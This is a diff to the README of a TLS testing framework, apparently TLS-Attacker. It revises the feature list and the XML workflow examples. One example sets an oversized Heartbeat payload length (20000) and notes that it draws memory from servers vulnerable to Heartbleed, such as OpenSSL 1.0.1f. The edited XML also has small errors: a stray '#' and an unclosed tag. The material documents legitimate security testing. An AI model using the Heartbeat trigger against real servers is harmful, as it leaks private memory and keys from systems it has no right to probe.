@@ -57,7 +57,7 @@ Currently, the following features are supported:
 - DTLS 1.2 (RFC-6347)(Currently under Development)
 - SSL 2 (Client/Server Hello)
 - (EC)DH and RSA key exchange algorithms
-- CBC and Streamciphers
+- CBC, AEAD and Streamciphers
 - TLS client and server
 - HTTPS
 - MitM (experimental)
@@ -146,31 +146,41 @@ We know many of you hate Java. Therefore, you can also use an XML structure and 
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <workflowTrace>
     <SendAction>
-        <ClientHello>
-            <extensions>
-                <HeartbeatExtension/>
-                <ECPointFormat/>
-                <EllipticCurves/>
-            </extensions>
-        </ClientHello>
+        <messages>
+            <ClientHello>
+                <extensions>
+                    <ECPointFormat/>#
+                    <HeartbeatExtension/>
+                    <EllipticCurves/>
+                </extensions>
+            </ClientHello>
+        </messages>
     </SendAction>
     <ReceiveAction>
-        <ServerHello>
-            <extensions>
-                <HeartbeatExtension/>
-                <ECPointFormat/>
-                <EllipticCurves/>
-            </extensions>
-        </ServerHello>
-        <Certificate/>
-        <ServerHelloDone/>
+        <expectedMessages>
+            <ServerHello>
+                <extensions>
+                    <ECPointFormat/>
+                </extensions>
+            </ServerHello>
+            <Certificate/>
+            <ServerHelloDone/>
+        </expectedMessages>
     </ReceiveAction>
     <SendAction>
-        <Finished/>
+        <messages>
+            <RSAClientKeyExchange>
+                <computations/>
+            </RSAClientKeyExchange>
+            <ChangeCipherSpec/>
+            <Finished/>
+        </messages>
     </SendAction>
     <ReceiveAction>
-        <ChangeCipherSpec/>
-        <Finished/>
+        <expectedMessages>
+            <ChangeCipherSpec/>
+            <Finished/>
+        </expectedMessages>
     </ReceiveAction>
 </workflowTrace>
 ```
@@ -195,49 +205,59 @@ We can of course use this concept by constructing our TLS workflows. Imagine you
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <workflowTrace>
     <SendAction>
-        <ClientHello>
-            <extensions>
-                <HeartbeatExtension/>
-                <ECPointFormat/>
-                <EllipticCurves/>
-            </extensions>
-        </ClientHello>
+        <messages>
+            <ClientHello>
+                <extensions>
+                    <ECPointFormat/>#
+                    <HeartbeatExtension/>
+                    <EllipticCurves/>
+                </extensions>
+            </ClientHello>
+        </messages>
     </SendAction>
     <ReceiveAction>
-        <ServerHello>
-            <extensions>
-                <HeartbeatExtension/>
-                <ECPointFormat/>
-                <EllipticCurves/>
-            </extensions>
-        </ServerHello>
-        <Certificate/>
-        <ServerHelloDone/>
+        <expectedMessages>
+            <ServerHello>
+                <extensions>
+                    <ECPointFormat/>
+                </extensions>
+            </ServerHello>
+            <Certificate/>
+            <ServerHelloDone/>
+        </expectedMessages>
     </ReceiveAction>
     <SendAction>
-		<RSAClientKeyExchange/>
-		<ChangeCipherSpec/>
-        <Finished/>
+        <messages>
+            <RSAClientKeyExchange>
+                <computations/>
+            </RSAClientKeyExchange>
+            <ChangeCipherSpec/>
+            <Finished/>
+        </messages>
     </SendAction>
     <ReceiveAction>
-        <ChangeCipherSpec/>
-        <Finished/>
+        <expectedMessages>
+            <ChangeCipherSpec/>
+            <Finished/>
+        </expectedMessages>
     </ReceiveAction>
     <SendAction>
-	<Heartbeat>
-            <payloadLength>
-                <integerExplicitValueModification>
-                    <explicitValue>20000</explicitValue>
-                </integerExplicitValueModification>
-            </payloadLength>
-        </Heartbeat><Heartbeat/>
+		<messages>
+			<Heartbeat>
+				<payloadLength>
+					<integerExplicitValueModification>
+						<explicitValue>20000</explicitValue>
+					</integerExplicitValueModification>
+				</payloadLength>
+			</Heartbeat>
+        </messages
     </SendAction>
     <ReceiveAction>
-	<Heartbeat/>
+		<Heartbeat/>
     </ReceiveAction>
 </workflowTrace>
 ```
-As you can see, we explicitly increased the payload length of the Heartbeat message by 2000.
+As you can see, we explicitly increased the payload length of the Heartbeat message by 20000.
 If you run the attack against the vulnerable server (e.g., OpenSSL 1.0.1f), you should see a valid Heartbeat response.
 
 Further examples on attacks and further explanations on TLS-Attacker can be found in the Wiki.
